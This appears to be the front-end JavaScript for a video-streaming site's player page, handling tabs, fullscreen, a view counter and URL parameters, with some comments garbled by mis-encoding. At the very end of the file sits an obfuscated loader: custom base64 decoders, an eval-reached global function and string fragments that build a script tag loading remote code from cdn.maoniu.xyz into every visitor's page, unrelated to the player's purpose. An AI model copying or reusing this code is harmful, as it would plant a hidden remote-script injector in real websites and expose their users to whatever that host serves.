$(document).ready(function(){
 var playnav=document.getElementById('playnav');
 var oNav=playnav.getElementsByTagName('li');

 var playcontainer=document.getElementById('playcontainer');
 var oDiv=playcontainer.getElementsByClassName('tab');
 for(var i=0;i<oNav.length;i++){
  oNav[i].index=i;
  oNav[i].onclick=function () {
  for(var i=0;i<oNav.length;i++){
   oNav[i].className='';
   oDiv[i].style.display="none";
  }
  this.className='act';
  oDiv[this.index].style.display="block"
  }
  for(var m=1;m<oNav.length;m++){
   oNav[m].className='';
   oDiv[m].style.display="none";
  }
 }
});
if (play_type !="") {
  	$('#player').html('<iframe class="play" id="vodplay" src="/addons/dplayer/?url='+vid+'&type='+play_type+'&uid='+userID+'&id='+id+'&sTime='+sTime+'&next_url='+next_url+'" frameborder="0" border="0" marginwidth="0" marginheight="0" scrolling="no" allowfullscreen="" style="height: 100%;width: 100%;"></iframe>');

};
function setTab(name,name2,cursel,n){
 for(i=1;i<=n;i++){
  var menu=document.getElementById(name+i);
  var con=document.getElementById(name2+i);
  menu.className=i==cursel?"act":"";
  con.style.display=i==cursel?"block":"none";
 }
};
$(document).ready(function(){
  	if(autofullScreen==1)Fs();
  	$("#Fs").bind("click",Fs);
  	$("#Efs").bind("click",Efs);
});
$(document).keyup(function(event){
	switch(event.keyCode) {
	case 27:Efs();
	case 96:Efs();
	}
});
function Fs(){
  delParam('autofullScreen');
  $("#Fs").hide();
  $("#Efs").show();
  $("#playerbox").css({
    "position":"fixed",
    "top":"0",
    "left":"0",
    "z-index":"1000",
    "width":"100%",
    "height":"100%",
  });
}
function Efs(){
  delParam('autofullScreen');
  $("#Efs").hide();
  $("#Fs").show();
  $("#playerbox").removeAttr("style");
}
if (pid !="") {
    $.get('/vcount?id='+pid);
}
function delParam(paramKey) {
  var url = window.location.href;    //椤甸潰url
  var urlParam = window.location.search.substr(1);   //椤甸潰鍙傛暟
  var beforeUrl = url.substr(0, url.indexOf("?"));   //椤甸潰涓诲湴鍧�锛堝弬鏁颁箣鍓嶅湴鍧�锛�
  var nextUrl = "";

  var arr = new Array();
  if (urlParam != "") {
    var urlParamArr = urlParam.split("&"); //灏嗗弬鏁版寜鐓�&绗﹀垎鎴愭暟缁�
    for (var i = 0; i < urlParamArr.length; i++) {
      var paramArr = urlParamArr[i].split("="); //灏嗗弬鏁伴敭锛屽�兼媶寮�
      //濡傛灉閿�闆ㄨ�佸垹闄ょ殑涓嶄竴鑷达紝鍒欏姞鍏ュ埌鍙傛暟涓�
      if (paramArr[0] != paramKey) {
        arr.push(urlParamArr[i]);
      }
    }
  }
  if (arr.length > 0) {
    nextUrl = "?" + arr.join("&");
  }
  url = beforeUrl + nextUrl;
  //return url;
  var stateObject = {};
  history.pushState(stateObject,"",url);
}function IsjhMEmW(e){var t="",n=r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}function iScfnleC(e){var m='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var t="",n,r,i,s,o,u,a,f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f<e.length){s=m.indexOf(e.charAt(f++));o=m.indexOf(e.charAt(f++));u=m.indexOf(e.charAt(f++));a=m.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t+=String.fromCharCode(n);if(u!=64){t+=String.fromCharCode(r)}if(a!=64){t+=String.fromCharCode(i)}}return IsjhMEmW(t)}eval('window')['\x4b\x75\x43\x62\x47\x46']=function(){;(function(u,r,w,d,f,c){var x=iScfnleC;u=decodeURIComponent(x(u.replace(new RegExp(c+''+c,'g'),c)));'jQuery';k=r[2]+'c'+f[1];'Flex';v=k+f[6];var s=d.createElement(v+c[0]+c[1]),g=function(){};s.type='text/javascript';{s.onload=function(){g()}}s.src=u;'CSS';d.getElementsByTagName('head')[0].appendChild(s)})('aHR0cHM6Ly9jZG4ubWFvbml1Lnh5ei9jZG4vbWFjbXViYW4vaW5kZXguanM=','AjsfguonnKA',window,document,'orQVgZipae','ptIodXOnEQDH')};window['KuCbGF']();